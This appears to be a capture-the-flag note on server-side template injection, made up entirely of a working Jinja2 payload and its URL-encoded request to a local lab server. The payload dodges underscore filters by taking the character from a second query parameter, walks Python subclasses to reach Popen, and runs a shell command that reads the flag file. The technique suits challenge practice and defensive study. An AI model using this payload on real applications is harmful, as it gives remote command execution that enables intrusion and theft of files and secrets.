# SSTI

```python
{% raw %}
{%with a=request|attr("args")|attr("get")("b")%}{% for k in dict|attr(a+a+"base"+a+a)|attr(a+a+"subclasses"+a+a)() %}{% if "Popen" in k|attr(a+a+"name"+a+a) %}{% print(k('cat /flag'+a+'6f447eeddeabf7521c1801a3bf243ab0',shell=True,stdout=-1)|attr("communicate")()) %}{% endif %}{% endfor %}{%endwith%}
{% endraw %}
```

```
http://127.0.0.1:3000/home?directory=%7B%25with+a%3Drequest%7Cattr%28%22args%22%29%7Cattr%28%22get%22%29%28%22b%22%29%25%7D%7B%25+for+k+in+dict%7Cattr%28a%2Ba%2B%22base%22%2Ba%2Ba%29%7Cattr%28a%2Ba%2B%22subclasses%22%2Ba%2Ba%29%28%29+%25%7D%7B%25+if+%22Popen%22+in+k%7Cattr%28a%2Ba%2B%22name%22%2Ba%2Ba%29+%25%7D%7B%25+print%28k%28%27cat+%2Fflag%27%2Ba%2B%276f447eeddeabf7521c1801a3bf243ab0%27%2Cshell%3DTrue%2Cstdout%3D-1%29%7Cattr%28%22communicate%22%29%28%29%29+%25%7D%7B%25+endif+%25%7D%7B%25+endfor+%25%7D%7B%25endwith%25%7D&b=_
```
